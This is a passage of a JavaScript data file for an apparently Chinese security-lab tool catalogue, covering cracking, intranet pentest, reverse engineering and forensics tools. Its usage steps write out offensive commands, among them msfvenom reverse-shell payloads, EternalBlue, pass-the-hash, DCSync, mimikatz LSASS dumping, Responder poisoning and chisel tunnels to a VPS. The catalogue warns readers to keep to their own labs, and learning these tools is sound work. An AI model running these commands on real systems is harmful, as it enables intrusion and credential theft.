/* ============================================================
   SEC//LAB · 工具数据（二）：密码破解 / 漏洞利用内网 / 逆向 / 取证
   ============================================================ */

TOOLS.push(
/* ---------------- 密码破解 ---------------- */
{
  id: "hashcat", name: "Hashcat", cat: "crack", icon: "HC", ver: "6.2.6",
  desc: "GPU 加速的哈希破解器，支持 300+ 种哈希算法。拿到 NTLM/MD5/影子文件后就靠它离线跑字典。",
  tags: ["GPU加速", "NTLM", "字典"], plat: "Win / Linux / macOS", lvl: "进阶",
  official: "https://hashcat.net/hashcat/", dl: "https://hashcat.net/hashcat/",
  steps: [
    { t: "下载对应版本", d: "官网 binaries 页：有 NVIDIA 显卡下 CUDA 版，AMD/Intel 显卡下 HIP 版，都没有就用通用版（CPU 会慢很多）。Windows 是 7z 压缩包，解压即用。" },
    { t: "解压到工具目录", d: "解压到 D:\\tools\\hashcat，用管理员权限开 PowerShell 进入该目录。" },
    { t: "确认算法编号", d: "NTLM=1000，MD5=0，SHA1=100，sha512crypt=1800，bcrypt=3200。不确定就用例子哈希反查。", cmd: "hashcat --example-hashes | findstr /i ntlm" },
    { t: "跑字典", d: "-m 算法，-a 0 字典模式；rockyou.txt 在 Kali 的 /usr/share/wordlists/ 下，Windows 需自己下。", cmd: "hashcat -m 1000 -a 0 hash.txt rockyou.txt -O -w 3" },
    { t: "加规则提高命中", d: "best64 / dive 规则能把 pass 变形出 Pass、p@ss、pass123 等变体。", cmd: "hashcat -m 1000 -a 0 hash.txt rockyou.txt -r rules/best64.rule" },
    { t: "看结果", d: "跑完加 --show 显示明文。", cmd: "hashcat -m 1000 hash.txt --show" }
  ],
  pit: "笔记本双显卡容易过热降频；virtualbox 里跑没 GPU 加速等于自虐。另外别开着 \\\\?\\GLOBALROOT 之类参数乱试，容易蓝屏。"
},
{
  id: "john", name: "John the Ripper", cat: "crack", icon: "JR", ver: "1.9-jumbo",
  desc: "老牌密码审计工具，jumbo 版支持自动识别哈希类型、Wordlist 规则、增量模式，Linux 影子文件破解首选。",
  tags: ["自动识别", "影子文件", "规则"], plat: "Win / Linux / macOS", lvl: "进阶",
  official: "https://www.openwall.com/john/", dl: "https://www.openwall.com/john/",
  steps: [
    { t: "Windows 下载 jumbo 版", d: "openwall 站下载 john-1.9.0-jumbo-1-win64.zip，解压出 run 目录（里面有 john.exe）。" },
    { t: "把哈希写成文件", d: "从 /etc/shadow 或 SAM 导出后存成 hash.txt，一行一个。" },
    { t: "自动识别并破解", d: "先 --test 确认能跑，再跑 wordlist。", cmd: "john --wordlist=password.lst hash.txt" },
    { t: "指定格式", d: "自动识别失败时手动指定，例如 NT、sha512crypt。", cmd: "john --format=NT --wordlist=rockyou.txt ntlm.txt" },
    { t: "查看已破解", d: "", cmd: "john --show hash.txt" }
  ],
  pit: "Windows 版路径里有空格会报错；jumbo 的 run 目录必须作为工作目录执行，否则找不到 john.conf。"
},
{
  id: "hydra", name: "THC Hydra", cat: "crack", icon: "HY", ver: "9.5",
  desc: "在线口令爆破器，支持 SSH/RDP/FTP/MySQL/HTTP 等 50+ 协议。仅在自有靶场使用，真实环境爆破极易触发锁定。",
  tags: ["在线爆破", "多协议", "字典"], plat: "Linux(推荐) / Win", lvl: "进阶",
  official: "https://github.com/vanhauser-thc/thc-hydra", dl: "https://github.com/vanhauser-thc/thc-hydra",
  steps: [
    { t: "Linux 安装（推荐在 Kali 里跑）", d: "Windows 编译麻烦，直接在 Kali 用 apt。", cmd: "sudo apt install -y hydra" },
    { t: "准备账号密码字典", d: "users.txt 每行一个用户名，pass.txt 每行一个密码。", cmd: "echo -e \"admin\\nroot\" > users.txt && printf \"123456\\nadmin\\npassword\\n\" > pass.txt" },
    { t: "对靶机 SSH 爆破", d: "-t 4 是并发 4，别开太高。", cmd: "hydra -l admin -P pass.txt 192.168.100.10 ssh -t 4 -V" },
    { t: "Web 表单爆破", d: "http-post-form 的格式是「路径:参数:失败特征」。", cmd: "hydra -l admin -P pass.txt 192.168.100.10 http-post-form \"/login.php:username=^USER^&password=^PASS^:F=用户名或密码错误\" -V" },
    { t: "看结果", d: "成功的组合会标绿输出 [PORT][ssh] host: x login: admin password: xxx。" }
  ],
  pit: "对真实系统爆破 = 攻击行为，且会锁账号、触发告警。很多 SRC 直接把爆破列为违规。练习请只打 127.0.0.1 / 自己的靶机。"
},
{
  id: "cewl", name: "CeWL", cat: "crack", icon: "CW", ver: "5.5",
  desc: "从目标网站爬取关键词生成专属字典，比如把公司的产品名、人名做成密码本，比通用字典命中率高。",
  tags: ["字典生成", "爬虫", "社工"], plat: "Linux / Ruby", lvl: "入门",
  official: "https://github.com/digininja/CeWL", dl: "https://github.com/digininja/CeWL",
  steps: [
    { t: "Kali 安装", d: "预装；或 gem 安装。", cmd: "sudo apt install -y cewl" },
    { t: "爬取生成字典", d: "-d 深度，-m 最小词长，-w 输出文件。", cmd: "cewl -d 2 -m 5 -w words.txt http://127.0.0.1" },
    { t: "加邮箱与数字变体", d: "", cmd: "cewl -d 2 -m 5 -e --email_file emails.txt -w words.txt http://target" },
    { t: "交给 hashcat 做规则变形", d: "纯词表命中率有限，配合规则效果更好。", cmd: "hashcat -m 1000 hash.txt words.txt -r rules/best64.rule" }
  ],
  pit: "只爬你自己或授权的站点。爬外站会留下大量访问日志，且对方可能直接判定为扫描行为。"
},
{
  id: "crunch", name: "Crunch", cat: "crack", icon: "CR", ver: "3.6",
  desc: "按规则生成暴力字典：指定字符集与长度，生成所有组合。生成速度快，配合掩码攻击用。",
  tags: ["字典生成", "掩码", "暴力"], plat: "Linux / Win", lvl: "进阶",
  official: "https://sourceforge.net/projects/crunch-wordlist/", dl: "https://sourceforge.net/projects/crunch-wordlist/",
  steps: [
    { t: "Kali 安装", d: "", cmd: "sudo apt install -y crunch" },
    { t: "生成纯数字 6 位", d: "输出会非常大（10^6 行），注意磁盘。", cmd: "crunch 6 6 0123456789 -o nums.txt" },
    { t: "自定义字符集", d: "-t 指定模式，@ 小写字母、, 大写、% 数字、^ 符号。", cmd: "crunch 8 8 -t @@@@%%%% -o pw.txt" },
    { t: "直接交给 hashcat（推荐掩码）", d: "其实更推荐用 hashcat 的 -a 3 掩码模式，不落地文件、快得多。", cmd: "hashcat -m 0 -a 3 hash.txt ?l?l?l?l?d?d?d?d" }
  ],
  pit: "字典体积爆炸是新手最常见的事故：8 位全字符集约 200TB。生成前先算空间，或直接用 hashcat 掩码模式。"
},

/* ---------------- 漏洞利用 / 内网 ---------------- */
{
  id: "metasploit", name: "Metasploit Framework", cat: "pentest", icon: "MSF", ver: "6.x",
  desc: "最主流的漏洞利用框架：几千个 exploit/payload/auxiliary 模块，从打点到提权到后渗透一条龙。",
  tags: ["漏洞利用", "payload", "后渗透"], plat: "Win / Linux / macOS", lvl: "进阶",
  official: "https://www.metasploit.com/", dl: "https://www.metasploit.com/download",
  steps: [
    { t: "选择安装方式", d: "Windows 用官方 installer（自带 Ruby 与 PostgreSQL，最省事）；Kali 已预装；Linux 也可用 Rapid7 的 apt 源。" },
    { t: "Windows 安装", d: "下载 exe → 一路 Next（会同时装 PostgreSQL 与 Nmap）→ 安装完成后开始菜单找「Metasploit Console」。" },
    { t: "首次启动并初始化数据库", d: "首次启动较慢，会建库。启动后执行 db_status 看是否连上。", cmd: "msfconsole -q", hint: "Windows 下如果 PostgreSQL 服务没起来，去服务里手动启动 postgresql-x64-13。" },
    { t: "搜模块并加载", d: "用 search 按关键词找，use 加载后 show options 看必填参数。", cmd: "search ms17_010 && use exploit/windows/smb/ms17_010_eternalblue" },
    { t: "配置并执行（仅靶场）", d: "RHOSTS 是目标，LHOST 是你自己（Kali 的 IP），LPORT 是回连端口。", cmd: "set RHOSTS 192.168.100.20 && set LHOST 192.168.100.10 && run" },
    { t: "生成 payload", d: "msfvenom 把 payload 做成 exe/elf/apk，学习免杀时常用。", cmd: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.10 LPORT=4444 -f exe -o shell.exe" }
  ],
  pit: "Defender 会直接删掉 msfvenom 生成的 exe（正常现象）。另外 meterpreter 在真实 EDR 环境下几乎必被抓，别把它当成「免杀」用。"
},
{
  id: "impacket", name: "Impacket", cat: "pentest", icon: "IM", ver: "0.12",
  desc: "Windows 协议 Python 库 + 一批成名脚本：psexec、wmiexec、secretsdump、ntlmrelayx、GetNPUsers…内网必备。",
  tags: ["SMB", "DCSync", "NTLM中继"], plat: "Win / Linux / macOS", lvl: "进阶",
  official: "https://github.com/fortra/impacket", dl: "https://github.com/fortra/impacket",
  steps: [
    { t: "安装", d: "建议在 venv 里装，避免和系统库冲突。", cmd: "python -m pip install impacket" },
    { t: "验证脚本可用", d: "安装后脚本在 Scripts 目录，直接调 getsids 试。", cmd: "python -m impacket.examples.getsids -h", hint: "报 ModuleNotFoundError 就是没在装它的那个 Python 环境里跑，先 activate venv。" },
    { t: "哈希传递拿 shell（靶场）", d: "-hashes 用 NTLM 哈希，不需要明文密码。", cmd: "python psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 administrator@192.168.100.20" },
    { t: "DCSync 导出域内哈希", d: "需要域管权限或可复制的账号。", cmd: "python secretsdump.py DOMAIN/admin:Password@192.168.100.20 -just-dc" },
    { t: "Kerberoasting 取票据", d: "找有 SPN 的服务账号并请求 TGS，离线破解。", cmd: "python GetUserSPNs.py DOMAIN/user:pass -dc-ip 192.168.100.20 -request" }
  ],
  pit: "psexec 会创建服务，留痕明显且可能被 AV 拦；wmiexec 无文件落盘更隐蔽。所有操作都要有授权，域内动 secretsdump 是最容易被审计发现的。"
},
{
  id: "mimikatz", name: "Mimikatz", cat: "pentest", icon: "MK", ver: "2.2.0",
  desc: "Windows 凭据提取经典工具：从 LSASS 读明文密码、哈希、Kerberos 票据，理解 Pass-the-Hash / 黄金票据必学。",
  tags: ["凭据提取", "LSASS", "票据"], plat: "Windows", lvl: "进阶",
  official: "https://github.com/gentilkiwi/mimikatz", dl: "https://github.com/gentilkiwi/mimikatz/releases",
  steps: [
    { t: "下载 release", d: "取 mimikatz_trunk.zip，解压得到 x64/x32 目录（优先跑 x64）。" },
    { t: "以管理员运行", d: "右键 mimikatz.exe → 以管理员身份运行。普通权限读不到 LSASS。" },
    { t: "提升调试权限", d: "先拿 SeDebugPrivilege，否则后面全部失败。", cmd: "privilege::debug" },
    { t: "抓内存里的明文密码", d: "只有系统未开启 WDigest 明文缓存时才可能拿到（Win10 之后默认关闭）。", cmd: "sekurlsa::logonpasswords" },
    { t: "导出哈希与票据", d: "", cmd: "lsadump::sam 与 sekurlsa::tickets /export", hint: "导出票据后可用 sekurlsa::ptt 注入，做 Pass-the-Ticket。" }
  ],
  pit: "Defender 与所有 EDR 都会秒杀 mimikatz 原版，这是检测最成熟的技术之一。学习时先关实时防护（仅限自己的虚拟机，且不要在联网生产机上关）。"
},
{
  id: "bloodhound", name: "BloodHound CE", cat: "pentest", icon: "BL", ver: "5.x",
  desc: "把 AD 的权限关系画成图，自动找出「谁对谁有 GenericAll / DCSync / 委派」的提权链，域渗透的导航仪。",
  tags: ["域分析", "攻击路径", "图数据库"], plat: "Win / Linux(Docker)", lvl: "高阶",
  official: "https://github.com/SpecterOps/BloodHound", dl: "https://github.com/SpecterOps/BloodHound/releases",
  steps: [
    { t: "用 Docker 起服务端", d: "社区版推荐 docker compose，一条命令起 Neo4j + API + UI。", cmd: "curl -L https://ghst.ly/getbhce | docker compose -f - up -d" },
    { t: "访问面板", d: "浏览器打开 http://localhost:8080，首次登录的用户名密码在启动日志里打印（找 Initial Password）。" },
    { t: "域内采集数据", d: "在域内机器上用 SharpHound.exe 采集（需域用户权限），或用 bloodhound-python 远程采集。", cmd: "bloodhound-python -u user -p pass -d domain.local -ns 192.168.100.20 -c All" },
    { t: "导入并分析", d: "上传 zip → 右上角搜索自己的用户 → 节点菜单选「Shortest Paths to Domain Admins」。" },
    { t: "常用查询", d: "内置查询：Kerberoastable Users、AS-REP Roastable、Shortest Path to High Value Targets。" }
  ],
  pit: "采集会在域控留下大量 LDAP 日志（Event 4662/1644），蓝队一眼就看见。别在客户生产域里随手跑 -c All。"
},
{
  id: "netexec", name: "NetExec (nxc)", cat: "pentest", icon: "NX", ver: "1.x",
  desc: "CrackMapExec 的接棒者：批量验证 SMB/WinRM/LDAP/MSSQL 凭据、抓共享、跑模块，内网横向的主力。",
  tags: ["横向移动", "凭据验证", "批量"], plat: "Linux / Win(Py)", lvl: "进阶",
  official: "https://github.com/Pennyw0rth/NetExec", dl: "https://github.com/Pennyw0rth/NetExec",
  steps: [
    { t: "安装", d: "用 pipx 或 venv 装（不要装进系统 Python）。", cmd: "pipx install netexec" },
    { t: "验证", d: "", cmd: "nxc --version" },
    { t: "批量验证 SMB 密码", d: "找到密码后别急着横向，先用它批量确认哪些机器可用。", cmd: "nxc smb 192.168.100.0/24 -u administrator -p 'Password123' --continue-on-success" },
    { t: "哈希传递", d: "-H 直接传 NTLM 哈希。", cmd: "nxc smb 192.168.100.20 -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0" },
    { t: "后渗透模块", d: "sam/lsa/secretsdump 导出本机凭据，--shares 枚举共享。", cmd: "nxc smb 192.168.100.20 -u administrator -p pass --sam --lsa --shares" }
  ],
  pit: "失败次数多了会锁账号（域策略默认 5 次），批量验证前先确认锁定策略。另外 --continue-on-success 不加会在第一次成功后就停，容易漏。"
},
{
  id: "responder", name: "Responder", cat: "pentest", icon: "RS", ver: "3.x",
  desc: "LLMNR/NBT-NS/mDNS 投毒，把内网主机的名称解析请求引到自己身上，抓 NetNTLM 哈希，内网开局经典手法。",
  tags: ["LLMNR投毒", "NetNTLM", "内网"], plat: "Linux", lvl: "高阶",
  official: "https://github.com/lgandx/Responder", dl: "https://github.com/lgandx/Responder",
  steps: [
    { t: "Kali 预装", d: "预装，配置在 /etc/responder/Responder.conf。" },
    { t: "关掉 SMB/HTTP 服务（为了配合中继）", d: "如果要配合 ntlmrelayx 做中继，必须把 Responder 的 SMB 和 HTTP 置 Off，否则它会自己接住认证而不转发。", cmd: "sudo sed -i 's/^SMB = On/SMB = Off/; s/^HTTP = On/HTTP = Off/' /etc/responder/Responder.conf" },
    { t: "启动投毒", d: "-I 指定网卡，-rdw 开 WPAD 伪造更有效。", cmd: "sudo responder -I eth0 -rdw" },
    { t: "等待哈希", d: "静置 5-30 分钟，有主机访问不存在的主机名就会发来 NetNTLMv2，日志在 /usr/share/responder/logs/。" },
    { t: "离线破解或中继", d: "哈希用 hashcat -m 5600 破，或者启动 ntlmrelayx 直接中继到其他机器。", cmd: "hashcat -m 5600 hashes.txt rockyou.txt" }
  ],
  pit: "投毒会干扰整个广播域（别人上网变慢、打印机找不到），只能在实验网段用。企业网里做这个基本等于立刻被逮。"
},
{
  id: "chisel", name: "Chisel", cat: "pentest", icon: "CH", ver: "1.9+",
  desc: "Go 写的 HTTP 隧道工具，单文件、走 443 像正常流量，用来把内网端口带出来或做 SOCKS 代理。",
  tags: ["隧道", "SOCKS", "内网"], plat: "全平台", lvl: "进阶",
  official: "https://github.com/jpillora/chisel", dl: "https://github.com/jpillora/chisel/releases",
  steps: [
    { t: "下载双端二进制", d: "Releases 里同时下 windows 与 linux 版，服务端放公网 VPS，客户端丢到内网机器。" },
    { t: "服务端起监听", d: "--reverse 允许客户端反向映射端口。", cmd: "./chisel server -p 8080 --reverse --socks5" },
    { t: "客户端连回并开 SOCKS", d: "R:socks 会在服务端开 1080 SOCKS5。", cmd: ".\\chisel.exe client 1.2.3.4:8080 R:socks" },
    { t: "本地用代理扫内网", d: "proxychains 走 socks5 127.0.0.1:1080。", cmd: "proxychains4 nmap -sT -Pn 10.0.0.0/24" },
    { t: "端口转发单端口", d: "把内网 3389 映射到本地 13389。", cmd: ".\\chisel.exe client 1.2.3.4:8080 R:13389:10.0.0.5:3389" }
  ],
  pit: "默认流量是明文 WebSocket，被抓包一眼识别；要隐蔽需加 --tls 或套 CDN。用于真实项目前先确认允许的技术手段。"
},
{
  id: "frp", name: "frp", cat: "pentest", icon: "FR", ver: "0.5x",
  desc: "内网穿透利器，把内网服务映射到公网 VPS：远程桌面、Web 后台、SSH 都能用，配置简单稳定。",
  tags: ["内网穿透", "端口映射", "VPS"], plat: "全平台", lvl: "入门",
  official: "https://github.com/fatedier/frp", dl: "https://github.com/fatedier/frp/releases",
  steps: [
    { t: "下载双端", d: "Releases 取 frp_x.x.x_windows_amd64.zip 与 linux_amd64 各一份，解压后改名 frpc / frps。" },
    { t: "服务端配置 frps.toml", d: "VPS 上写监听端口与 token，token 必配，否则谁都能连你的 frps。", cmd: "[common]\nbindPort = 7000\nauth.token = 换成随机长字符串" },
    { t: "启动服务端", d: "", cmd: "./frps -c frps.toml" },
    { t: "客户端配置 frpc.toml", d: "把内网 3389 映射到 VPS 的 13389。", cmd: "serverAddr = \"1.2.3.4\"\nserverPort = 7000\nauth.token = \"同一个 token\"\n[[proxies]]\nname = \"rdp\"\ntype = \"tcp\"\nlocalIP = \"127.0.0.1\"\nlocalPort = 3389\nremotePort = 13389" },
    { t: "启动客户端并验证", d: "在本地用 mstsc 连 VPS_IP:13389 即可。", cmd: ".\\frpc.exe -c frpc.toml" }
  ],
  pit: "把内网服务暴露到公网 = 给全网攻击者开门，映射完一定加白名单/防火墙，用完立刻关。另外 frp 流量特征明显，云厂商可能告警。"
},

/* ---------------- 逆向分析 ---------------- */
{
  id: "ida", name: "IDA Free", cat: "reverse", icon: "IDA", ver: "8.x",
  desc: "反汇编与反编译的事实标准，Free 版支持 x86/x64 云反编译，看样本逻辑比 Ghidra 顺手。",
  tags: ["反汇编", "反编译", "静态分析"], plat: "Win / Linux / macOS", lvl: "高阶",
  official: "https://hex-rays.com/", dl: "https://hex-rays.com/ida-free",
  steps: [
    { t: "注册下载", d: "官网 IDA Free 页面填邮箱获取下载链接（免费但需注册）。装完是 IDA Free 版，功能足够看样本。" },
    { t: "打开样本", d: "File → Open 选 exe/dll/elf，弹出加载框时按默认（x86/x64 自动识别）→ OK。" },
    { t: "先看字符串", d: "Shift+F12 打开 Strings 窗口，找 URL、IP、命令行、可疑 API 名，快速定性样本。" },
    { t: "跳到函数并用 F5 反编译", d: "在反汇编窗口按 F5（Hex-Rays）得到类 C 代码，比读汇编快 10 倍。" },
    { t: "交叉引用与重命名", d: "X 看谁调用了这个函数，N 重命名，边看边起有意义的名字，逻辑很快就清晰了。" }
  ],
  pit: "IDA Free 不支持插件与部分架构（ARM 需另装）。分析前一定在虚拟机/隔离环境里做，且样本要去掉网络连接。"
},
{
  id: "ghidra", name: "Ghidra", cat: "reverse", icon: "GH", ver: "11.x",
  desc: "NSA 开源的逆向平台，反编译质量接近 IDA 且完全免费、支持多架构，还能写脚本批量分析。",
  tags: ["开源", "反编译", "多架构"], plat: "Win / Linux / macOS", lvl: "高阶",
  official: "https://ghidra-sre.org/", dl: "https://github.com/NationalSecurityAgency/ghidra/releases",
  steps: [
    { t: "准备 JDK 21", d: "Ghidra 11 需要 JDK 21（不是 JRE）。装完设置 JAVA_HOME 指向 JDK 目录。", cmd: "setx JAVA_HOME \"C:\\Program Files\\Java\\jdk-21\"" },
    { t: "下载解压", d: "Releases 取 ghidra_11.x_PUBLIC.zip，解压到 D:\\tools\\ghidra。" },
    { t: "启动", d: "运行 ghidraRun.bat（Windows）。首次会要求设置工程目录。" },
    { t: "导入样本并分析", d: "File → Import File → 选样本 → 双击打开 → 弹窗点 Analyze → 默认选项即可。" },
    { t: "看反编译", d: "在 Symbol Tree 找 main 或 entry，右侧 Decompile 窗口直接出 C 代码；Ctrl+Shift+F 全局搜索字符串。" }
  ],
  pit: "Ghidra 吃内存，8G 机器分析大样本会卡；修改分析选项里的 Max CPU 可提速。反编译输出比 IDA 啰嗦，需要习惯。"
},
{
  id: "x64dbg", name: "x64dbg", cat: "reverse", icon: "XD", ver: "2024.x",
  desc: "Windows 平台开源调试器，动态分析恶意代码、脱壳、找解密循环的主力，界面比 OllyDbg 现代得多。",
  tags: ["动态调试", "脱壳", "断点"], plat: "Windows", lvl: "高阶",
  official: "https://x64dbg.com/", dl: "https://github.com/x64dbg/x64dbg/releases",
  steps: [
    { t: "下载 snapshot", d: "Releases 取 snapshot_xxxx.zip，解压运行 release\\x96dbg.exe（会自动装 x32/x64 两个版本）。" },
    { t: "在虚拟机里运行", d: "样本千万不要在宿主机跑。用快照，跑完回滚。" },
    { t: "打开样本", d: "File → Open → 选 exe。停在系统断点后按 F9 让程序跑起来。" },
    { t: "定位关键逻辑", d: "常用手段：Ctrl+G 跳 API（如 CreateFileW、InternetOpenUrlA），或在字符串引用上下硬件断点。" },
    { t: "脱壳", d: "单步到 OEP（观察段变化 + 栈平衡），用 Scylla 插件 dump 并修复 IAT。" }
  ],
  pit: "很多样本检测调试器（IsDebuggerPresent、PEB 标志），需要装 ScyllaHide 插件隐藏；调试前先给虚拟机断网。"
},
{
  id: "dnspyex", name: "dnSpyEx", cat: "reverse", icon: "DN", ver: "6.5",
  desc: ".NET 逆向神器：直接反编译成 C#、可修改 IL 并保存回 exe，分析 Cobalt Strike 衍生木马、窃密程序必用。",
  tags: [".NET", "反编译", "改IL"], plat: "Windows", lvl: "进阶",
  official: "https://github.com/dnSpyEx/dnSpy", dl: "https://github.com/dnSpyEx/dnSpy/releases",
  steps: [
    { t: "下载", d: "取 dnSpy-net-win64.zip（原版 dnSpy 已停更，用社区维护的 dnSpyEx）。解压运行 dnSpy.exe。" },
    { t: "打开样本", d: "File → Open → 选 exe/dll。左侧 Assembly Explorer 展开命名空间。" },
    { t: "找入口与配置", d: "双击 <Module>.cctor 或 Main 看初始化逻辑；搜字符串（Ctrl+Shift+K）找 C2 地址、密钥。" },
    { t: "看方法体", d: "选中方法，右侧直接显示 C# 源码，可调试断点。" },
    { t: "修改并保存", d: "右键方法 → Edit Method (C#) → 改完点 Compile → File → Save Module 生成新 exe。仅用于分析研究。" }
  ],
  pit: "混淆过的 .NET 样本（ConfuserEx、SmartAssembly）需要先脱壳/去混淆，直接打开会看到一堆 <PrivateImplementationDetails>。"
},
{
  id: "jadx", name: "jadx", cat: "reverse", icon: "JX", ver: "1.5",
  desc: "APK 反编译成 Java 源码，配 jadx-gui 直接浏览，分析安卓木马、找硬编码密钥与接口地址首选。",
  tags: ["APK", "Java", "安卓"], plat: "Win / Linux / macOS", lvl: "进阶",
  official: "https://github.com/skylot/jadx", dl: "https://github.com/skylot/jadx/releases",
  steps: [
    { t: "下载", d: "取 jadx-1.5.x.zip，解压后运行 bin\\jadx-gui.bat（需要 Java 11+）。" },
    { t: "打开 APK", d: "File → Open → 选 apk，自动反编译（大 apk 需要几分钟）。" },
    { t: "先看 AndroidManifest", d: "左侧 Resources/AndroidManifest.xml，重点看权限、exported 组件、启动 Activity。" },
    { t: "搜关键字", d: "Ctrl+Shift+F 全局搜索 http、api、token、secret、AES、C2 域名。" },
    { t: "导出源码", d: "File → Save As Gradle Project，配合 Android Studio / PhpStorm 交叉阅读。", cmd: "jadx -d out apk文件.apk" }
  ],
  pit: "加固过的 APK（360、梆梆、腾讯乐固）jadx 只能看到壳代码，需要先脱壳（frida-dexdump / FRIDA-DEXDump）。"
},
{
  id: "frida", name: "Frida", cat: "reverse", icon: "FD", ver: "16.x",
  desc: "动态插桩框架，运行时 Hook 函数、改返回值、绕过证书绑定与 root 检测，移动端逆向的核心工具。",
  tags: ["Hook", "动态插桩", "移动端"], plat: "全平台", lvl: "高阶",
  official: "https://frida.re/", dl: "https://frida.re/docs/installation/",
  steps: [
    { t: "宿主机装 frida-tools", d: "PC 侧装客户端工具。", cmd: "pip install frida-tools" },
    { t: "设备侧装 frida-server", d: "按设备架构（arm64/x86_64）下载对应 frida-server，push 到 /data/local/tmp 并 chmod 755。" },
    { t: "启动服务", d: "需要 root（或已 patch 的 app）。", cmd: "adb shell \"su -c '/data/local/tmp/frida-server &'\"" },
    { t: "确认连接", d: "PC 上能看到设备上的进程列表。", cmd: "frida-ps -U" },
    { t: "Hook 一个函数", d: "写 JS 脚本，打印参数与返回值。", cmd: "frida -U -f com.example.app -l hook.js --no-pause" },
    { t: "常用现成脚本", d: "objection 一行绕过 SSL pinning，比手写快。", cmd: "objection -g com.example.app explore -s \"android sslpinning disable\"" }
  ],
  pit: "frida-server 和 frida-tools 版本必须一致，不一致会报 protocol error；高版本安卓还要处理 ptrace 限制与 seccomp。"
},
{
  id: "apktool", name: "APKTool", cat: "reverse", icon: "AP", ver: "2.9+",
  desc: "APK 反编译/回编译工具，把资源、Manifest、smali 全解出来，改包重打包、去广告、插桩调试都用它。",
  tags: ["APK", "smali", "重打包"], plat: "Win / Linux / macOS", lvl: "进阶",
  official: "https://apktool.org/", dl: "https://github.com/iBotPeaches/Apktool/releases",
  steps: [
    { t: "下载 jar + wrapper", d: "取 apktool_x.x.x.jar 与 apktool.bat（Windows 包装脚本），都放同一目录并加进 PATH。" },
    { t: "确认 Java", d: "", cmd: "java -version" },
    { t: "反编译", d: "-f 覆盖，-o 输出目录；得到 smali、res、AndroidManifest.xml。", cmd: "apktool d app.apk -o app_src -f" },
    { t: "修改 smali", d: "用 VS Code / PhpStorm 打开 .smali 文件，按 Java 逻辑对应修改，注意寄存器数量（.registers）不能乱改。" },
    { t: "回编译并签名", d: "回编译后必须签名才能安装。", cmd: "apktool b app_src -o new.apk && apksigner sign --ks my.keystore new.apk" }
  ],
  pit: "回编译失败 90% 是资源 ID 或 smali 语法问题；改过的包签名变了，原签名校验（重打包检测）会触发，需要额外 patch。"
},
{
  id: "die", name: "Detect It Easy", cat: "reverse", icon: "DIE", ver: "3.x",
  desc: "查壳、查编译器、查加密算法的瑞士军刀，分析样本第一步就用它看「是什么语言写的、有没有加壳」。",
  tags: ["查壳", "编译器识别", "熵"], plat: "Win / Linux / macOS", lvl: "入门",
  official: "https://github.com/horsicq/Detect-It-Easy", dl: "https://github.com/horsicq/Detect-It-Easy/releases",
  steps: [
    { t: "下载", d: "Releases 取 die_Win_x64.zip 或安装版，解压即用。" },
    { t: "拖入样本", d: "把 exe 拖进窗口，立刻显示：编译器（MSVC/GCC/Go/Rust）、链接器、是否加壳（UPX/Themida/VMProtect）、文件熵。" },
    { t: "看区段与熵", d: "区段名 UPX0/UPX1 或熵接近 8.0 基本就是加壳/加密，需要先脱壳再分析。" },
    { t: "配合查字符串与签名", d: "右键 → Strings / Signatures，快速判断样本族。" }
  ],
  pit: "老版本对 Go 1.20+ 识别不准，下最新 release。查壳结果只是提示，最终还要靠调试器验证。"
},

/* ---------------- 取证与流量 ---------------- */
{
  id: "wireshark", name: "Wireshark", cat: "forensics", icon: "WS", ver: "4.2+",
  desc: "最主流的网络协议分析器，抓包、过滤、重组 TCP 流、导出文件，流量取证和协议学习的必备工具。",
  tags: ["抓包", "协议分析", "流量取证"], plat: "Win / Linux / macOS", lvl: "入门",
  official: "https://www.wireshark.org/", dl: "https://www.wireshark.org/download.html",
  steps: [
    { t: "安装", d: "下载 Windows x64 Installer → 一路 Next → 组件页确保勾 Npcap（抓包驱动）→ 安装完成。" },
    { t: "选网卡开始抓包", d: "首页双击有流量的网卡（有波浪线的那个），开始实时抓包。" },
    { t: "基础过滤", d: "过滤栏输入表达式，回车生效。写完记得 Ctrl+Shift+C 收藏常用过滤。", cmd: "ip.addr == 192.168.100.20 && http" },
    { t: "跟踪 TCP 流", d: "右键任意包 → Follow → TCP Stream，能看到完整请求响应（明文 HTTP 时最有用）。" },
    { t: "导出传输的文件", d: "File → Export Objects → HTTP，把网页加载的图片、压缩包、exe 全导出来（恶意流量分析常用）。" },
    { t: "统计与排查", d: "Statistics → Protocol Hierarchy 看协议分布；Statistics → Conversations 找异常大流量会话。" }
  ],
  pit: "无线网卡抓包需要支持监听模式的网卡；只抓本机流量时用 loopback 适配器。别在生产网段长时间全量抓包，会吃满磁盘。"
},
{
  id: "volatility3", name: "Volatility 3", cat: "forensics", icon: "V3", ver: "2.x",
  desc: "内存取证标准框架，从内存镜像里提取进程、网络连接、注入代码、注册表与凭据，应急响应的核心武器。",
  tags: ["内存取证", "进程分析", "恶意代码"], plat: "Win / Linux / macOS", lvl: "高阶",
  official: "https://github.com/volatilityfoundation/volatility3", dl: "https://github.com/volatilityfoundation/volatility3",
  steps: [
    { t: "安装", d: "建议在 venv 里 pip 装，顺便装符号表依赖。", cmd: "pip install volatility3" },
    { t: "确认能用", d: "", cmd: "vol -h" },
    { t: "先看镜像信息", d: "拿到内存镜像（.raw/.dmp/.vmem）第一件事是识别系统版本。", cmd: "vol -f mem.raw windows.info" },
    { t: "看进程与网络", d: "pslist 正常进程链，pstree 看父子关系，netscan 看连接。", cmd: "vol -f mem.raw windows.pslist && vol -f mem.raw windows.netscan" },
    { t: "查隐藏/注入", d: "psscan 找被摘链的进程；malfind 找 RWX 内存段（无文件攻击的痕迹）。", cmd: "vol -f mem.raw windows.malfind" },
    { t: "提取可疑文件与命令行", d: "dumpfiles 导出进程内存中的文件，cmdline 看启动参数。", cmd: "vol -f mem.raw windows.cmdline && vol -f mem.raw windows.dumpfiles --physaddr 0x1a2b3c" }
  ],
  pit: "Volatility 3 不再需要 profile，但需要下载符号表（首次联网自动下，内网要先下好 windows.zip 放 symbols 目录）。镜像格式不对会报 InvalidFileException。"
},
{
  id: "autopsy", name: "Autopsy", cat: "forensics", icon: "AU", ver: "4.21",
  desc: "开源数字取证平台（Sleuth Kit 图形界面）：分析磁盘镜像、恢复删除文件、提取浏览器与邮件记录、出时间线。",
  tags: ["磁盘取证", "镜像分析", "时间线"], plat: "Win / Linux / macOS", lvl: "进阶",
  official: "https://www.autopsy.com/", dl: "https://www.autopsy.com/download/",
  steps: [
